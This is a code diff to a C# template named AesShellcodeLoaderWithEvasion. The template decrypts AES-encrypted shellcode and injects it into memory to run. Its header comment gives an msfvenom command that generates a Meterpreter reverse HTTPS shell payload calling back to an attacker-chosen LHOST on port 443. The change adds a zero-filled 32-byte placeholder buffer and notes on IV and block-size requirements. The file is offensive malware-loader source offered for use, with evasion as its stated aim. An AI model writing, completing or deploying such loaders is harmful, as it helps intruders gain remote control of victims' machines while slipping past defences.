@@ -1,5 +1,5 @@
 // =============================================================================
-// TEMPLATE — replace buf with your encrypted shellcode before compiling
+// TEMPLATE - replace buf with your encrypted shellcode before compiling
 //
 // Generate and encrypt shellcode:
 //   1. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
@@ -62,9 +62,15 @@ namespace AesShellcodeLoaderWithEvasion
             }
 
             // Your full AES-encrypted shellcode (replace with actual)
-            byte[] buf = new byte[896] {
-                // Paste your full encrypted buf here
-            };
+            // CRITICAL: must be at least 32 bytes (16-byte IV + 16-byte minimum ciphertext)
+            // and ciphertext portion must be a multiple of 16 bytes (AES block size).
+            // Generate with: aes-shellcode-encryption/aes-shellcode-encryption.cs
+            byte[] buf = new byte[32] {
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+            }; // TODO: paste your full encrypted bytes here (min 32: 16 IV + 16+ ciphertext)
 
             byte[] decryptedShellcode = Decrypt(buf);
             InjectAndExecute(decryptedShellcode);
